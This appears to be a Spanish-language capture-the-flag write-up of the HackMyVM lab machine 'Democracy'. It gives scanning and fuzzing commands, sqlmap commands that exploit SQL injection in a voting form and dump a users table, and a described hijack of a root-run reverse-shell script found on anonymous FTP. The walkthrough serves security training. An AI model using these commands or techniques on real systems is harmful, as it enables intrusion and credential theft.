# Máquina Democracy
### Reconocimiento de la Ip de la máquina víctima

![alt text](image.png)

tenía dominio democracy.hmv y lo agregué al /etc/hosts

### Puertos abiertos

sudo nmap -sS --disable-arp-ping --min-rate 6000 -p- --open -vvv -Pn 10.0.2.29

![alt text](image-1.png)

### Servicios y versiones

sudo nmap -sVC --min-rate 6000 -p22,80 -vvv -Pn 10.0.2.29

![alt text](image-2.png)

### Fuzzing Web

feroxbuster --url http://democracy.hmv/ -w /usr/share/seclists/Discovery/Web-Content/big.txt

![alt text](image-3.png)

### Explotación

Accediendo a la web:

![alt text](image-4.png)

Al acceder a Go to voting

![alt text](image-5.png)

me creé una cuenta y accedí

![alt text](image-6.png)

comencé a jugar con la web y me dí cuenta que había SQLi en el select candidate

apliqué este pequeño script para resetear la votación

![alt text](image-7.png)

luego de eso usé SQLMAP.

sqlmap --url http://democracy.hmv/vote.php --data "candidate=flag" -p candidate --cookie "PHPSESSID=0i770ouk3905vslec00f9sqr1a; voted=1" --batch --dbs

![alt text](image-8.png)

visualizo las tablas:

sqlmap --url http://democracy.hmv/vote.php --data "candidate=flag" -p candidate --cookie "PHPSESSID=0i770ouk3905vslec00f9sqr1a; voted=1" --batch --dbs -D voting --tables

![alt text](image-9.png)

dumpeo la tabla users:

sqlmap --url http://democracy.hmv/vote.php --data "candidate=flag" -p candidate --cookie "PHPSESSID=0i770ouk3905vslec00f9sqr1a; voted=1" --batch --dbs -D voting --tables -T users --columns --dump

guardo los usuarios y las contraseñas en archivos separados:

![alt text](image-10.png)

Creé el siguiente script para que se puedan hacer las 1000 votaciones a favor de democrat

![alt text](image-11.png)

![alt text](image-12.png)

realicé otra vez un escaneo de puertos

![alt text](image-13.png)

![alt text](image-14.png)

Igreso al servidor FTP anonymous

![alt text](image-15.png)

hay un script hace una reverse shell que pertenece a root y se ejecuta cada minuto

lo descargué, modifiqué mi IP-kali y lo volví a subir

![alt text](image-16.png)



### Escalar privilegios

me puse en escucha con netcat al puerto 4444

![alt text](image-17.png)


### user.txt

![alt text](image-19.png)

### root.txt

![alt text](image-18.png)